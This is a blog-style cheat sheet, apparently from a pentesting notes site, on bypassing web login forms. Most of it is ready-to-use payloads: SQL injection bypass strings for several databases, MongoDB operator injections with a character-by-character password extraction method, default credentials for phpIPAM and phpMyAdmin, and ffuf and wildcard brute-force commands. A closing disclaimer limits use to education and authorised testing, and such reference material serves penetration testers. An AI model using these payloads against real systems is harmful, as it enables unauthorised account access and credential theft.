---
title: WEB LOGIN BYPASS
date: 2023-05-05 01:35:40 +/-TTTT
categories: [learning, web]
tags: [learning]     # TAG names should always be lowercase
---

# SQL INJECTION     
```
admin' or '1'='1
```
# Microsoft, Oracle, PostgreSQL
```
admin'--
admin' or 1=1--
admin' or '1'='1'--

admin}" or 1=1--
```
# MySQL
```
admin'-- -
admin'#

admin' or 1=1#
admin' or 1=1-- -

admin' or '1'='1'-- -
admin' or '1'='1'#

admin}" or 1=1-- -
```
# NoSQL Injection
`MONGO`
```
admin' || 1==1//
admin' || 1==1%00
admin' || '1==1
admin' || '1'=='1
```
* Operators

```JS
# $ne: Not equal
username[$ne]=xyz&password[$ne]=xyz

# $regex: Regular expressions
username[$regex]=.*&password[$regex]=.*
username[$regex]=^xyz&password[$regex]=^xyz
username[$regex]=^a.*$&password[$ne]=xyz
username[$regex]=.{6}&password[$ne]=xyz
username[$regex]=^.{1}&password[$regex]=^.{1} # Length of values

# $exists: Exists in the database
username[$exists]=true&password[$exists]=true

# $nin: Not include
username[$nin][admin]=admin&password[$ne]=xyz
# If we found the "admin" exists, we can exclude "admin" by specifying $nin operator.
username[$nin][]=admin&password[$ne]=xyz
# If more users are found, we can exclude the user.
username[$nin][]=admin&username[$nin][]=john&password[$ne]=xyz

# $gt: Greater than
username[$gt]=s&password[$gt]=s
# $lt: Lower than
username[$lt]=s&password[$lt]=s

# Combinations
username[$ne]=xyz&password[$regex]=.*
username[$exists]=true&password[$ne]=xyz
username[$ne]=xyz&password[$exists]=true
username[$regex]=.*&password[$ne]=xyz
username[$ne]=xyz&password[$regex]=.*
username[$regex]=.{6}&password[$ne]=xyz
```

After finding usernames, we can also obtain the passwords using the “$regex” operator as the following example.

```JS
# Check if the password length is 7 characters.
username=admin&password[$regex]=^.{7}$
# If not, change 7 to 6 (or 8 or something number).
username=admin&password[$regex]=^.{6}$
# If the number of characters turns out to be 6, brute force the character one by one.
username=admin&password[$regex]=^a.....$
username=admin&password[$regex]=^s.....$
username=admin&password[$regex]=^se....$
username=admin&password[$regex]=^sec...$
```
* Operators in Json

If the above payloads not working, try changing to a json format.
We also need to change the value of the Content-Type to “application/json” in the HTTP header.

```js
Content-Type: application/json

{"username": { "$ne": "xyz" }, "password": { "$ne": "xyz" }}
```
# Default Credentials
```
admin:admin
admin:password
admin:password1
admin:password123
administrator:password
administrator:password1
administrator:password123

# phpIPAM
admin:ipamadmin
Admin:ipamadmin

# PHPMyAdmin
root:(null)
root:password
```
# Wildcard Brute Force
If it is allowed to login with wildcard (*), you may be able to find the username/password with brute force.
```
username = *
password = *
```
For example, in Turbo Intruder (Burp Suite), login attempt with alpha numeric characters one by one.
```
username=%s*&password=*
# or
username=*&password=%s*
```
My favorite wordlist for it is the seclists:

* https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/alphanum-case-extra.txt

# Brute Force Credentials
Before brute forcing, we need wordlists used for it.

* Rockyou : https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz

* SecLists : https://github.com/danielmiessler/SecLists 

* CeWL : https://github.com/digininja/CeWL

Generate the custom wordlist from the target web page.
```
cewl https://vulnerable.com > scraped_words.txt
```
# Ffuf
```js
# -fc: Filter HTTP status code
ffuf -w passwords -X POST -d "username=admin&password=FUZZ" -u http://vulnerable.com/login -fc 401

# Basic Auth
ffuf -u https://admin:FUZZ@example.com/ -w wordlist.txt -fc 401
```
# REFERENCE
* https://tryhackme.com/room/nosqlinjectiontutorial

# Disclaimer
```
Exploit Notes are only for educational purpose or penetration testing, not attacking servers that you're not authorized. This site will not take any responsibility even if you attack the server illegally or cause damage unintentionally. Please use the contents in this site at your own risk.
The contents of this site are not original, but based on the information on the internet, the author actually tried and functioned. Although the author strives to post the latest information on the content of this site as much as possible, there is no guarantee that it will always be new.
```
